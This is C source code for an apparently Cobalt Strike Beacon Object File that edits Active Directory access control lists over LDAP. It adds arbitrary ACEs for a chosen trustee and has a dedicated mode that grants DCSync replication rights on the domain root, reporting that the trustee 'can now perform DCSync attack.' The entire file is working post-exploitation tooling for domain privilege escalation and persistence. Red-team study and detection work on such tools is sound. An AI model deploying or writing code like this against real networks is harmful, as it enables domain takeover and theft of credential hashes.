#include <windows.h>
#include "../../_include/beacon.h"
#include "../common/ldap_common.c"
#include "../common/acl_common.c"

DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int c, size_t count);

// Structure to hold ACE parameters for adding
typedef struct _ACE_TO_ADD {
    ACCESS_MASK accessMask;
    BYTE aceType;
    BYTE aceFlags;
    GUID* pObjectTypeGuid;
    GUID* pInheritedObjectTypeGuid;
} ACE_TO_ADD;

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    
    // Parse arguments: 
    // target_identifier, is_target_dn, trustee_identifier, is_trustee_dn, access_mask, ace_type, ace_flags,
    // object_type_guid (optional), inherited_object_type_guid (optional),
    // search_ou, dc_address, use_ldaps
    char* targetIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTargetDN = BeaconDataInt(&parser);
    char* trusteeIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTrusteeDN = BeaconDataInt(&parser);
    char* accessMaskStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* aceTypeStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* aceFlagsStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* objectTypeGuidStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* inheritedObjectTypeGuidStr = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* searchOu = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);
    
    // Validate required parameters
    if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
        return;
    }
    
    if (!trusteeIdentifier || MSVCRT$strlen(trusteeIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Trustee identifier is required");
        return;
    }
    
    if (!accessMaskStr || MSVCRT$strlen(accessMaskStr) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Access mask is required");
        return;
    }
    
    
    // Check if this is a DCSync operation (requires multiple ACEs)
    BOOL isDCSync = IsDCSyncKeyword(accessMaskStr);
    
    // Prepare ACE(s) to add
    ACE_TO_ADD* acesToAdd = NULL;
    DWORD aceCount = 0;
    GUID dcsyncGuid1, dcsyncGuid2;
    GUID objectTypeGuid, inheritedObjectTypeGuid;
    
    if (isDCSync) {
        // DCSync requires 2 ACEs with different GUIDs
        BeaconPrintf(CALLBACK_OUTPUT, "[*] DCSync operation detected");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Will add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All");
        
        // Parse the two DCSync GUIDs
        MSVCRT$memset(&dcsyncGuid1, 0, sizeof(GUID));
        MSVCRT$memset(&dcsyncGuid2, 0, sizeof(GUID));
        
        if (!StringToGuid(GUID_DS_REPLICATION_GET_CHANGES, &dcsyncGuid1) ||
            !StringToGuid(GUID_DS_REPLICATION_GET_CHANGES_ALL, &dcsyncGuid2)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse DCSync GUIDs");
            return;
        }
        
        // Allocate array for 2 ACEs
        acesToAdd = (ACE_TO_ADD*)MSVCRT$malloc(2 * sizeof(ACE_TO_ADD));
        if (!acesToAdd) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed");
            return;
        }
        
        // First ACE: DS-Replication-Get-Changes
        acesToAdd[0].accessMask = ADS_RIGHT_DS_CONTROL_ACCESS;
        acesToAdd[0].aceType = ACCESS_ALLOWED_OBJECT_ACE_TYPE;
        acesToAdd[0].aceFlags = 0;
        acesToAdd[0].pObjectTypeGuid = &dcsyncGuid1;
        acesToAdd[0].pInheritedObjectTypeGuid = NULL;
        
        // Second ACE: DS-Replication-Get-Changes-All
        acesToAdd[1].accessMask = ADS_RIGHT_DS_CONTROL_ACCESS;
        acesToAdd[1].aceType = ACCESS_ALLOWED_OBJECT_ACE_TYPE;
        acesToAdd[1].aceFlags = 0;
        acesToAdd[1].pObjectTypeGuid = &dcsyncGuid2;
        acesToAdd[1].pInheritedObjectTypeGuid = NULL;
        
        aceCount = 2;
        
    } else {
        // Single ACE - parse parameters
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Access Mask: %s", accessMaskStr);
        
        ACCESS_MASK accessMask = ParseAccessMask(accessMaskStr);
        if (accessMask == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse access mask");
            return;
        }
        
        BYTE aceType = ParseAceType(aceTypeStr);
        BYTE aceFlags = ParseAceFlags(aceFlagsStr);
        
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed access mask: 0x%08x", accessMask);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE type: 0x%02x (%s)", aceType, GetAceTypeString(aceType));
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE flags: 0x%02x", aceFlags);
        
        // Parse GUIDs if provided
        GUID* pObjectTypeGuid = NULL;
        GUID* pInheritedObjectTypeGuid = NULL;
        
        if (objectTypeGuidStr && MSVCRT$strlen(objectTypeGuidStr) > 0) {
            MSVCRT$memset(&objectTypeGuid, 0, sizeof(GUID));
            if (StringToGuid(objectTypeGuidStr, &objectTypeGuid)) {
                pObjectTypeGuid = &objectTypeGuid;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Object Type GUID");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Object Type GUID");
                return;
            }
        }
        
        if (inheritedObjectTypeGuidStr && MSVCRT$strlen(inheritedObjectTypeGuidStr) > 0) {
            MSVCRT$memset(&inheritedObjectTypeGuid, 0, sizeof(GUID));
            if (StringToGuid(inheritedObjectTypeGuidStr, &inheritedObjectTypeGuid)) {
                pInheritedObjectTypeGuid = &inheritedObjectTypeGuid;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Inherited Object Type GUID");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Inherited Object Type GUID");
                return;
            }
        }
        
        if (aceTypeStr && MSVCRT$strlen(aceTypeStr) > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Type: %s", aceTypeStr);
        }
        if (aceFlagsStr && MSVCRT$strlen(aceFlagsStr) > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Flags: %s", aceFlagsStr);
        }
        
        // Allocate single ACE
        acesToAdd = (ACE_TO_ADD*)MSVCRT$malloc(sizeof(ACE_TO_ADD));
        if (!acesToAdd) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed");
            return;
        }
        
        acesToAdd[0].accessMask = accessMask;
        acesToAdd[0].aceType = aceType;
        acesToAdd[0].aceFlags = aceFlags;
        acesToAdd[0].pObjectTypeGuid = pObjectTypeGuid;
        acesToAdd[0].pInheritedObjectTypeGuid = pInheritedObjectTypeGuid;
        
        aceCount = 1;
    }
    
    // Display optional parameters
    if (searchOu && MSVCRT$strlen(searchOu) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Search OU: %s", searchOu);
    }
    if (dcAddress && MSVCRT$strlen(dcAddress) > 0) {
    }
    if (useLdaps) {
    }
    
    // Initialize LDAP connection
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing LDAP connection...");
    char* dcHostname = NULL;
    LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
        if (acesToAdd) MSVCRT$free(acesToAdd);
        return;
    }
    
    // Get default naming context
    char* defaultNC = GetDefaultNamingContext(ld, dcHostname);
    if (!defaultNC) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
        if (dcHostname) MSVCRT$free(dcHostname);
        if (acesToAdd) MSVCRT$free(acesToAdd);
        CleanupLDAP(ld);
        return;
    }
    
    // Variables for cleanup
    char* targetDN = NULL;
    char* trusteeDN = NULL;
    PSID pTrusteeSid = NULL;
    BERVAL* sdBerval = NULL;
    PACL pNewDacl = NULL;
    BERVAL* newSdBerval = NULL;
    
    // Resolve target DN
    if (isDCSync && !isTargetDN && MSVCRT$strlen(targetIdentifier) == 0) {
        // For DCSync, empty target means domain root
        size_t len = MSVCRT$strlen(defaultNC) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) {
            MSVCRT$strcpy(targetDN, defaultNC);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using domain root: %s", targetDN);
        }
    } else if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetIdentifier) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) {
            MSVCRT$strcpy(targetDN, targetIdentifier);
        }
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
        if (!targetDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
            goto cleanup;
        }
    }
    
    if (!targetDN) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
        goto cleanup;
    }
    
    // Resolve trustee DN and get SID
    
    if (isTrusteeDN) {
        size_t len = MSVCRT$strlen(trusteeIdentifier) + 1;
        trusteeDN = (char*)MSVCRT$malloc(len);
        if (trusteeDN) {
            MSVCRT$strcpy(trusteeDN, trusteeIdentifier);
        }
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        trusteeDN = FindObjectDN(ld, trusteeIdentifier, searchBase);
        if (!trusteeDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Trustee '%s' not found", trusteeIdentifier);
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved trustee DN: %s", trusteeDN);
    }
    
    // Get trustee's SID
    pTrusteeSid = GetObjectSid(ld, trusteeDN);
    if (!pTrusteeSid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get trustee's objectSid");
        goto cleanup;
    }
    
    if (!ADVAPI32$IsValidSid(pTrusteeSid)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Retrieved trustee SID is invalid");
        goto cleanup;
    }
    
    char* trusteeSidStr = SidToString(pTrusteeSid);
    if (trusteeSidStr) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Trustee SID: %s", trusteeSidStr);
        MSVCRT$free(trusteeSidStr);
    }
    
    // Read current security descriptor
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Reading security descriptor...");
    sdBerval = ReadSecurityDescriptor(ld, targetDN);
    if (!sdBerval) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor");
        goto cleanup;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Read security descriptor (%d bytes)", sdBerval->bv_len);
    
    // Get current DACL
    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)sdBerval->bv_val;
    PACL pOldDacl = NULL;
    BOOL daclPresent = FALSE;
    BOOL daclDefaulted = FALSE;
    
    if (!ADVAPI32$GetSecurityDescriptorDacl(pSD, &daclPresent, &pOldDacl, &daclDefaulted)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get DACL from security descriptor");
        goto cleanup;
    }
    
    if (!daclPresent) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No DACL present - will create new one");
    } else if (pOldDacl) {
        ACL_SIZE_INFORMATION aclInfo;
        if (ADVAPI32$GetAclInformation(pOldDacl, &aclInfo, sizeof(aclInfo), AclSizeInformation)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Current DACL has %d ACE(s)", aclInfo.AceCount);
        }
    }
    
    // Add ACE(s) in a loop
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Adding %d ACE(s)...", aceCount);
    
    pNewDacl = pOldDacl; // Start with existing DACL
    
    for (DWORD i = 0; i < aceCount; i++) {
        ACE_TO_ADD* currentAce = &acesToAdd[i];
        
        if (isDCSync) {
            char* guidName = GetGuidFriendlyName(currentAce->pObjectTypeGuid);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE %d/%d: %s", i+1, aceCount, 
                        guidName ? guidName : "Extended Right");
            if (guidName) MSVCRT$free(guidName);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE: Access=0x%08x, Type=%s", 
                        currentAce->accessMask, GetAceTypeString(currentAce->aceType));
        }
        
        // Create new DACL with this ACE
        PACL pTempDacl = CreateNewDaclWithAce(
            pNewDacl,
            pTrusteeSid,
            currentAce->accessMask,
            currentAce->aceType,
            currentAce->aceFlags,
            currentAce->pObjectTypeGuid,
            currentAce->pInheritedObjectTypeGuid
        );
        
        if (!pTempDacl) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create DACL with ACE %d", i+1);
            // If this isn't the first ACE, free the previous new DACL
            if (i > 0 && pNewDacl != pOldDacl) {
                MSVCRT$free(pNewDacl);
            }
            goto cleanup;
        }
        
        // Free the previous new DACL if we're not on the first iteration
        if (i > 0 && pNewDacl != pOldDacl) {
            MSVCRT$free(pNewDacl);
        }
        
        pNewDacl = pTempDacl;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ACE %d/%d added successfully", i+1, aceCount);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] All ACEs added to DACL");
    
    // Build new security descriptor
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Building new security descriptor...");
    
    BYTE absoluteSDBuffer[SECURITY_DESCRIPTOR_MIN_LENGTH];
    PSECURITY_DESCRIPTOR pNewSD = (PSECURITY_DESCRIPTOR)absoluteSDBuffer;
    
    if (!ADVAPI32$InitializeSecurityDescriptor(pNewSD, SECURITY_DESCRIPTOR_REVISION)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize security descriptor");
        goto cleanup;
    }
    
    // Copy owner and group from original
    PSID pOwner = NULL;
    BOOL ownerDefaulted = FALSE;
    ADVAPI32$GetSecurityDescriptorOwner(pSD, &pOwner, &ownerDefaulted);
    if (pOwner) {
        ADVAPI32$SetSecurityDescriptorOwner(pNewSD, pOwner, ownerDefaulted);
    }
    
    PSID pGroup = NULL;
    BOOL groupDefaulted = FALSE;
    ADVAPI32$GetSecurityDescriptorGroup(pSD, &pGroup, &groupDefaulted);
    if (pGroup) {
        ADVAPI32$SetSecurityDescriptorGroup(pNewSD, pGroup, groupDefaulted);
    }
    
    // Set the new DACL
    if (!ADVAPI32$SetSecurityDescriptorDacl(pNewSD, TRUE, pNewDacl, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set DACL");
        goto cleanup;
    }
    
    // Copy SACL if present
    PACL pSacl = NULL;
    BOOL saclPresent = FALSE;
    BOOL saclDefaulted = FALSE;
    if (ADVAPI32$GetSecurityDescriptorSacl(pSD, &saclPresent, &pSacl, &saclDefaulted)) {
        if (saclPresent) {
            ADVAPI32$SetSecurityDescriptorSacl(pNewSD, TRUE, pSacl, saclDefaulted);
        }
    }
    
    // Convert to self-relative format for LDAP
    newSdBerval = ConvertSecurityDescriptorToBerval(pNewSD);
    if (!newSdBerval) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor");
        goto cleanup;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Security descriptor ready (%d bytes)", newSdBerval->bv_len);
    
    // Write back to LDAP
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Writing modified security descriptor...");
    BOOL writeSuccess = WriteSecurityDescriptor(ld, targetDN, newSdBerval);
    
    if (writeSuccess) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: ACE(s) added successfully!");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Added: %d ACE(s)", aceCount);
        
        if (isDCSync) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] DCSync rights granted, Trustee can now perform DCSync attack");
        }
        
        // Verify
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Verifying changes...");
        BERVAL* verifyBerval = ReadSecurityDescriptor(ld, targetDN);
        if (verifyBerval) {
            PSD_INFO verifyInfo = ParseSecurityDescriptor((BYTE*)verifyBerval->bv_val, 
                                                          verifyBerval->bv_len);
            if (verifyInfo) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Verification: DACL now has %d ACE(s)", 
                            verifyInfo->DaclAceCount);
                FreeSecurityDescriptorInfo(verifyInfo);
            }
            MSVCRT$free(verifyBerval->bv_val);
            MSVCRT$free(verifyBerval);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "\n[-] FAILED to add ACE(s)");
    }

cleanup:
    // Free all allocated resources
    if (newSdBerval) {
        if (newSdBerval->bv_val) MSVCRT$free(newSdBerval->bv_val);
        MSVCRT$free(newSdBerval);
    }
    if (pNewDacl && pNewDacl != pOldDacl) MSVCRT$free(pNewDacl);
    if (sdBerval) {
        if (sdBerval->bv_val) MSVCRT$free(sdBerval->bv_val);
        MSVCRT$free(sdBerval);
    }
    if (pTrusteeSid) MSVCRT$free(pTrusteeSid);
    if (trusteeDN) MSVCRT$free(trusteeDN);
    if (targetDN) MSVCRT$free(targetDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    if (dcHostname) MSVCRT$free(dcHostname);
    if (acesToAdd) MSVCRT$free(acesToAdd);
    CleanupLDAP(ld);
    
}